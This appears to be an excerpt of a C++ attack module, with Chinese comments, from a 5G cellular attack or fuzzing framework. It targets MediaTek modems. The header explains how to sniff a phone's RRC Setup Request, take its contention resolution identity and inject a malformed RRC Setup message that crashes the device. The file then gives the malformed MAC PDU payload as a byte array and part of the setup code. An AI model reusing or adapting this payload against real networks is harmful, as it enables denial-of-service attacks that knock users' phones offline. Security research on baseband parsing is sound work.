/**
 * @file mac_sch_mtk_rrc_setup_crash_4.cc
 * @brief DoS 攻击模块 —— MediaTek 芯片 RRC Setup 崩溃 (变体 4)
 *
 * 与 mac_sch_rrc_setup_crash_var.cc 攻击原理完全相同：
 *   1. 监听 UE 的 RRC Setup Request
 *   2. 提取 con_res_id (UE Contention Resolution Identity)
 *   3. 注入畸形 RRC Setup 消息导致 UE 崩溃
 *
 * 本变体使用不同的畸形 ASN.1 编码，针对 MTK 芯片组的另一处解析缺陷。
 * 注意与变体 3 相比，offset [35] 处的值不同 (0xd6 vs 0x4c)，
 * 触发不同的 RRC IE 解析路径。
 *
 * 参见 mac_sch_rrc_setup_crash_var.cc 中的详细注释了解攻击流程。
 */
...
/** 畸形 RRC Setup MAC PDU — MTK 变体 4 */
const uint8_t original_rrc_setup[] = {
    0x3e, 0x13, 0xc8, 0x90, 0x7d, 0x43, 0xd0, 0x00, 0x88, 0x28, 0x40, 0x04, 0x04, 0x1a, 0xe0, 0x05, 0x80, 0x08, 0x8b,
    0xd7, 0x63, 0x80, 0x83, 0x0f, 0x80, 0x03, 0xe0, 0x10, 0x23, 0x41, 0xe0, 0x40, 0x00, 0x20, 0x90, 0xd6, 0x0c, 0xa8,
    0x04, 0x0f, 0xff, 0xf8, 0x00, 0x00, 0x00, 0x08, 0x00, 0x01, 0xb8, 0xa2, 0x10, 0x00, 0x04, 0x00, 0xb2, 0x80, 0x00,
    0x24, 0x10, 0x00, 0x02, 0x20, 0x49, 0xa0, 0x6a, 0xa4, 0x71, 0x80, 0x00, 0x20, 0x04, 0x04, 0x00, 0x08, 0x00, 0xd0,
...
public:
  ...
  void setup() override
  {
    ...
    f_ue_identity       = wd_field("nr-rrc.randomValue");
  }
